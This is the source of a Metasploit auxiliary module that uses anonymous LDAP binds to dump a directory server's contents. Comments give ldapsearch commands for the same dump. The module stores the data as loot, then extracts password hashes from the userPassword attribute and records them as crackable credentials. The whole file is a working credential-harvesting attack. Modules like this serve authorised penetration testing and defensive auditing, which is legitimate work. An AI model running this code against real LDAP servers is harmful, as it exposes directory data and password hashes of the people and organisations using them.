##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Information Disclosure',
        'Description' => %q{
          This module uses an anonymous-bind LDAP connection to dump data from
          an LDAP server. Searching for attributes with user credentials
          (e.g. userPassword).
        },
        'Author' => [
          'Hynek Petrak', # Discovery, hash dumping
          'wvu' # Module
        ],
        'References' => [
        ],
        'DisclosureDate' => '2020-07-23',
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', 'Description' => 'Dump all LDAP data']
        ],
        'DefaultAction' => 'Dump',
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(636), # SSL/TLS
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('USER_ATTR', [false, 'LDAP attribute, that contains username', 'dn']),
      OptString.new('PASS_ATTR', [true, 'LDAP attribute, that contains password hashes', 'userPassword'])
    ])
  end

  def base_dn
    @base_dn ||= 'dc=vsp'
  end

  def pass_attr
    @pass_attr ||= 'userPassword'
  end

  def user_attr
    @user_attr ||= 'dn'
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted] \* + -
  def run
    entries = nil

    ldap_connect do |ldap|
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = discover_base_dn(ldap))
          print_warning('Falling back on default base DN dc=vsp')
        end
      end

      print_status("Dumping LDAP data from server at #{peer}")

      entries = ldap.search(base: base_dn)
    end

    # We are ok with any entry returned
    unless entries && entries.any?
      print_error("#{peer} LDAP server did not return any entries")
      return Exploit::CheckCode::Safe
    end

    pillage(entries)

    # HACK: Stash discovered base DN in CheckCode reason
    Exploit::CheckCode::Vulnerable(base_dn)
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
    Exploit::CheckCode::Unknown
  end

  def pillage(entries)
    # TODO: Make this more efficient?
    ldif = entries.map(&:to_ldif).map{|s| s.force_encoding('utf-8')}.join("\n")

    print_status('Storing LDAP data in loot')

    ldif_filename = store_loot(
      name, # ltype
      'text/plain', # ctype
      rhost, # host
      ldif, # data
      nil, # filename
      "Base DN: #{base_dn}" # info
    )

    unless ldif_filename
      print_error('Could not store LDAP data in loot')
      return
    end

    print_good("Saved LDAP data to #{ldif_filename}")

    unless @pass_attr
      @pass_attr = datastore["PASS_ATTR"]
    end

    print_status("Searching for attribute: #{@pass_attr}")
    # Process entries with a non-empty userPassword attribute
    process_hashes(entries.select { |entry| entry[@pass_attr].any? })
  end

  def process_hashes(entries)
    if entries.empty?
      print_status('No password hashes found')
      return
    end

    service_details = {
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'avaya/ldap'
    }

    unless @user_attr
      @user_attr = datastore["USER_ATTR"]
    end

    unless @user_attr
      @user_attr = "dn"
    end

    print_status("Taking #{@user_attr} attribute as username")

    entries.each do |entry|
      # This is the "username"
      dn = entry[@user_attr].first #.dn

      hash = entry[@pass_attr].first

      # Skip empty hashes '{CRYPT}x'
      if hash.nil? || hash.empty? ||
          (hash.downcase.start_with?("{crypt}") && hash.length < 10)
        next
      end
      hash.gsub!('{crypt}$1$', '$1$')

      print_good("Credentials found: #{dn}:#{hash}")

      create_credential(service_details.merge(
        username: dn,
        private_data: hash,
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(hash)
      ))
    end
  end

end

